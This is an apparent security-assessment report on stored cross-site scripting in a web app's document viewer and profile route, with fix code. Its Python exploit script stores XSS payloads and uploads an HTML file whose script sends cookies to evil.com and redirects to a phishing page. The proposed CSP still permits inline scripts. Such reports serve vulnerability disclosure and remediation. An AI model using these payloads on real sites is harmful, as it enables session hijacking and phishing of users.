# Vulnerability: Cross-Site Scripting (XSS)

## 1. Vulnerability Name
**CWE-79: Improper Neutralization of Input During Web Page Generation**

## 2. Location in Code
- **File:** `frontend/src/components/UserDashboard.js` (lines 120-180)
- **File:** `backend/src/routes/profile.js` (lines 35-50)

```javascript
// UserDashboard.js - Unsafe HTML rendering in document viewer
const handleViewDocument = async (docId) => {
    const response = await documentsAPI.viewDocument(docId);
    const { document, content, contentType } = response.data;
    
    const viewWindow = window.open('', '_blank');
    
    // VULNERABILITY: Direct HTML injection without sanitization
    viewWindow.document.write(`
        <html>
          <head><title>View: ${document.title}</title></head>
          <body>
            <h2>ðŸ“„ ${document.title}</h2>
            <p>Description: ${document.description || 'No description'}</p>
            <p>Owner: ${document.owner?.email || 'Unknown'}</p>
            <div>${content}</div>
          </body>
        </html>
    `);
};

// profile.js - Unvalidated user input storage
router.put('/', auth, async (req, res) => {
    const { fullName, bio } = req.body;
    
    // VULNERABILITY: No input validation or sanitization
    if (fullName !== undefined) user.profile.fullName = fullName;
    if (bio !== undefined) user.profile.bio = bio;
    
    await user.save();
    res.json({ profile: user.profile });
});
```

## 3. Technical Root Cause
The application renders user-controlled content directly into HTML without proper sanitization or encoding. Document titles, descriptions, and profile information can contain malicious JavaScript that executes when viewed by other users, leading to stored XSS attacks.

## 4. Proof of Concept Explanation
1. Upload a document with malicious JavaScript in the title/description
2. Update user profile with XSS payload in fullName or bio fields
3. When other users view the document or profile, the script executes
4. Steal session tokens, redirect users, or perform actions on their behalf

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import json

def exploit_xss():
    base_url = "http://localhost:5000"
    
    # Login to get authentication token
    login_data = {"email": "demo@tenantguard.com", "password": "demo123"}
    login_response = requests.post(f"{base_url}/api/auth/login", json=login_data)
    
    if login_response.status_code != 200:
        print("[-] Login failed")
        return False
    
    token = login_response.json().get('token')
    headers = {"Authorization": f"Bearer {token}"}
    
    print("[+] Testing XSS vulnerabilities...")
    
    # Test 1: Profile XSS via fullName field
    print("\\n[1] Testing stored XSS in profile...")
    xss_payload_name = '<script>alert("XSS in Profile Name!")</script>'
    xss_payload_bio = '<img src=x onerror="alert(\\'XSS in Bio!\\')"/>'
    
    profile_data = {
        "fullName": xss_payload_name,
        "bio": xss_payload_bio
    }
    
    profile_response = requests.put(
        f"{base_url}/api/profile",
        headers=headers,
        json=profile_data
    )
    
    if profile_response.status_code == 200:
        print("[!] XSS PAYLOAD STORED IN PROFILE")
        print(f"    Name payload: {xss_payload_name}")
        print(f"    Bio payload: {xss_payload_bio}")
    
    # Test 2: Document XSS via file upload with malicious filename
    print("\\n[2] Testing XSS via document upload...")
    
    # Create malicious file content
    xss_content = '''<html>
<head><title>Innocent Document</title></head>
<body>
<h1>Normal Content</h1>
<script>
    // Steal cookies and send to attacker
    fetch('http://evil.com/steal?cookie=' + document.cookie);
    
    // Redirect to phishing site
    setTimeout(() => {
        window.location = 'http://evil.com/phishing';
    }, 2000);
    
    // Modify page content
    document.body.innerHTML = '<h1>Your session has expired. Please login again.</h1>';
</script>
</body>
</html>'''
    
    # Save malicious file
    with open('malicious.html', 'w') as f:
        f.write(xss_content)
    
    # Upload with XSS in title and description
    xss_title = '<script>alert("Document XSS!")</script>'
    xss_description = '<svg onload="alert(\\'Description XSS!\\')"/>'
    
    with open('malicious.html', 'rb') as f:
        files = {'file': ('malicious.html', f, 'text/html')}
        data = {
            'title': xss_title,
            'description': xss_description
        }
        
        upload_response = requests.post(
            f"{base_url}/api/documents/upload",
            headers=headers,
            files=files,
            data=data
        )
    
    if upload_response.status_code == 201:
        document_id = upload_response.json().get('document', {}).get('_id')
        print("[!] MALICIOUS DOCUMENT UPLOADED")
        print(f"    Document ID: {document_id}")
        print(f"    Title XSS: {xss_title}")
        print(f"    Description XSS: {xss_description}")
        
        # Test document viewing (triggers XSS)
        print("\\n[3] Testing document view XSS trigger...")
        view_response = requests.get(
            f"{base_url}/api/documents/{document_id}/view",
            headers=headers
        )
        
        if view_response.status_code == 200:
            print("[!] DOCUMENT VIEW SUCCESSFUL - XSS WILL TRIGGER ON FRONTEND")
            content = view_response.json().get('content', '')
            if '<script>' in content:
                print("    CRITICAL: Script tags found in document content")
    
    # Test 3: Comment/Search XSS (if endpoints exist)
    print("\\n[4] Testing search parameter XSS...")
    search_xss = '<script>alert("Search XSS")</script>'
    
    search_response = requests.get(
        f"{base_url}/api/users",
        headers=headers,
        params={"search": search_xss}
    )
    
    if search_response.status_code == 200:
        print("[!] SEARCH XSS PAYLOAD PROCESSED")
        print(f"    Payload: {search_xss}")
    
    # Cleanup
    import os
    if os.path.exists('malicious.html'):
        os.remove('malicious.html')
    
    print("\\n[+] XSS testing completed")
    print("[!] WARNING: Payloads are now stored and will execute when viewed by users")
    
    return True

if __name__ == "__main__":
    exploit_xss()
```

## 6. Impact
- **Session Hijacking:** Steal authentication tokens and impersonate users
- **Data Theft:** Access sensitive information from other users' sessions
- **Phishing Attacks:** Redirect users to malicious sites for credential theft
- **Account Takeover:** Perform actions on behalf of victims

**CVSS Score:** 7.2 (High)

## 7. Fix Recommendation

Implement proper input validation and output encoding:

```javascript
// Frontend XSS prevention
import DOMPurify from 'dompurify';

// Secure document viewer
const handleViewDocument = async (docId) => {
    const response = await documentsAPI.viewDocument(docId);
    const { document, content, contentType } = response.data;
    
    // Sanitize all user-controlled content
    const sanitizedTitle = DOMPurify.sanitize(document.title);
    const sanitizedDescription = DOMPurify.sanitize(document.description || 'No description');
    const sanitizedOwner = DOMPurify.sanitize(document.owner?.email || 'Unknown');
    
    // For HTML content, use strict sanitization
    const sanitizedContent = DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u'],
        ALLOWED_ATTR: []
    });
    
    const viewWindow = window.open('', '_blank');
    
    // Use textContent for user data, innerHTML only for sanitized content
    const container = viewWindow.document.createElement('div');
    container.innerHTML = `
        <html>
          <head><title>Document Viewer</title></head>
          <body>
            <h2 id="title"></h2>
            <p>Description: <span id="description"></span></p>
            <p>Owner: <span id="owner"></span></p>
            <div id="content"></div>
          </body>
        </html>
    `;
    
    viewWindow.document.write(container.innerHTML);
    
    // Set content using textContent (safe) or sanitized innerHTML
    viewWindow.document.getElementById('title').textContent = document.title;
    viewWindow.document.getElementById('description').textContent = document.description || 'No description';
    viewWindow.document.getElementById('owner').textContent = document.owner?.email || 'Unknown';
    viewWindow.document.getElementById('content').innerHTML = sanitizedContent;
};

// Backend input validation
const validator = require('validator');
const xss = require('xss');

// Secure profile update
router.put('/', auth, async (req, res) => {
    try {
        const { fullName, bio } = req.body;
        
        const user = await User.findById(req.user._id);
        if (!user) {
            return res.status(404).json({ error: 'User not found' });
        }
        
        if (!user.profile) {
            user.profile = {};
        }
        
        // Validate and sanitize inputs
        if (fullName !== undefined) {
            // Length validation
            if (fullName.length > 100) {
                return res.status(400).json({ error: 'Full name too long' });
            }
            
            // XSS prevention
            user.profile.fullName = xss(fullName, {
                whiteList: {}, // No HTML tags allowed
                stripIgnoreTag: true,
                stripIgnoreTagBody: ['script']
            });
        }
        
        if (bio !== undefined) {
            // Length validation
            if (bio.length > 500) {
                return res.status(400).json({ error: 'Bio too long' });
            }
            
            // XSS prevention with limited HTML
            user.profile.bio = xss(bio, {
                whiteList: {
                    p: [],
                    br: [],
                    strong: [],
                    em: []
                },
                stripIgnoreTag: true,
                stripIgnoreTagBody: ['script']
            });
        }
        
        await user.save();
        
        res.json({
            message: 'Profile updated successfully',
            profile: user.profile
        });
    } catch (error) {
        res.status(500).json({ error: 'Failed to update profile' });
    }
});

// Content Security Policy headers
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', 
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: https:; " +
        "connect-src 'self';"
    );
    next();
});
```